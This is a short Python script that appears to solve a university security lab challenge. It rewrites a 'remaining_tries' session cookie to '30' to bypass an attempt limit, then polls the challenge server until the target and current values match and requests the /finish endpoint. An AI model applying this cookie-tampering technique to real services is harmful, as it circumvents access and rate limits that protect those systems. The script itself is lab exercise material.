#dificuldade em mudar a string value

import requests

SERVER = 'http://mustard.stt.rnl.tecnico.ulisboa.pt:22054/more'

session = requests.session()

## Similar for other methods
r = session.get(SERVER)
#print(session.cookies)
all_cookies = requests.utils.dict_from_cookiejar(session.cookies)

r = session.get(SERVER)
#print(f'GET 1 cookies : {r.cookies}')
#print(r.text)

r = session.get(SERVER)
#print(f'GET 2 cookies : {r.cookies}')
#print(r.text)

for cookie in session.cookies:
    if (cookie.name == 'remaining_tries'):
        cookie.value = '30'
        break

#CCheck if cookies really changed
r = session.get(SERVER)
print(f'r : {r.cookies}')
print(r.text)

i=0 ; target =  1 ; current = 1
lst_check_target = []
lst_check_current = []
while (i<40):
    r = session.get(SERVER)
    
    split_list = r.text.split()
    #print(split_list)

    for c in split_list[6]:
        if c.isdigit():
            lst_check_target.append(int(c))
    #print(lst_check_target)

    for c in split_list[-1]:
        if c.isdigit():
            lst_check_current.append(int(c))
    #print(lst_check_current)

    if(lst_check_current == lst_check_target):
        r_fini = session.get('http://mustard.stt.rnl.tecnico.ulisboa.pt:22054/finish')
        print(r_fini.text)
        break

    lst_check_target = []; lst_check_current = []
    i+=1 
